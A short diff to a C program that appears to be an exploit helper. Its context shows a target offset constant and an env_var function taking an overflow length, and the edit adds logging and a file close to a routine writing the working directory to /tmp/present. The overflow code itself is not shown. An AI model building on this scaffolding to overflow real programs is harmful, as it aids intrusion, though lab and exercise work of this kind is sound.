@@ -4,6 +4,7 @@
 #include <unistd.h>
 #define ENV_LEN 512
 #define TARGET_OFFSET_START 0x786
+#define TMP_PATH "/tmp/present"
 #define PATH_LEN 255
 #define CHECK(e)                                                               \
   if ((e)) {                                                                   \
@@ -19,12 +20,14 @@ char *env_var(char *var, int overflow_len, char c) {
 }
 
 void write_to_tmp() {
-  FILE *tmp = fopen("/tmp/present", "w");
+  FILE *tmp = fopen(TMP_PATH, "w");
   CHECK(tmp == 0);
   char path[PATH_LEN] = {0};
   CHECK(getcwd(path, PATH_LEN) == 0);
   int path_len = strlen(path);
   CHECK(fwrite(path, sizeof(char), path_len, tmp) != path_len);
+  printf("write cwd %s to %s", path, TMP_PATH);
+  fclose(tmp);
 }
 
 int main() {
